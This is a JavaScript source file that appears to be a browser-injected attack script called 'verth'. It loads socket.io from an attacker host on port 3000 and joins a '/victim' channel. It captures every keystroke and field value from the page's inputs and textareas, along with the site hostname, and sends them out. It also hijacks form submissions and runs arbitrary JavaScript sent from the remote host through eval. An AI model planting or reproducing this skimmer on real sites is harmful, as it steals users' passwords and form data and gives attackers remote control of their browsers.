(function(){
verth = {

  load: function(socket) {
    console.log("HostIP", hostIP);
    this.loadScript(socket, function(){
      var socket = io('http://'+hostIP+':3000/victim')
      verth.init(socket)
    })
  }

, init: function(socket, options) {
    this.socket = socket
    this.log = {}
    this.send(this.header())
    setTimeout(function(){
      verth.bind()
    }, 500)
  }

, send: function(input) {
    if (!input || this.sent(input))
      return false
    this.socket.emit('input', {
      id: input.id
    , msg: input.value
    , type: input.type
    })
  }

, bind: function() {
    var fields = document.querySelectorAll('input, textarea')
    for (var i = 0; i < fields.length; i++)
        this.hijack(fields[i])
    document.addEventListener("submit", function(e){
      e.preventDefault();
      verth.tail(e.target)
    })
  }

, hijack: function(field, typing) {

    field.onkeyup = function(){
      if (!field.value)
        return false
      verth.send({
        id: field.id
      , type: 'key'
      , value: field.value
      })
    }

    field.onblur = function(){
      verth.send({
        id: field.id
      , type: 'input'
      , value: field.value
      })
    }

  }

, exploit: function(payload) {
    socket.on('exec', function(js) {
      eval(js)
    })
  }

, header: function() {
    var header = {
      "host": window.location.hostname
    }
    for (i in header)
      verth.send({
        id: i
      , value: header[i]
      })
  }

, tail: function(e) {
    for (id in verth.log)
      value = verth.log[id]
    verth.send({
      id: id
    , value: value
    })
    e.submit()
  }

, sent: function(input) {
    if (input.id in this.log &&
        this.log[input.id] == input.value &&
        input.type != 'input')
      return true;
    this.log[input.id] = input.value;
    return false
}

, loadScript: function(url, callback) {
    var head   = document.getElementsByTagName('head')[0]
    var script = document.createElement('script')
    script.type = 'text/javascript'
    script.src = url
    script.onload = callback
    script.onreadystatechange = callback
    head.appendChild(script)
  }

}
verth.load('http://'+hostIP+':3000/socket.io/socket.io.js')
}())
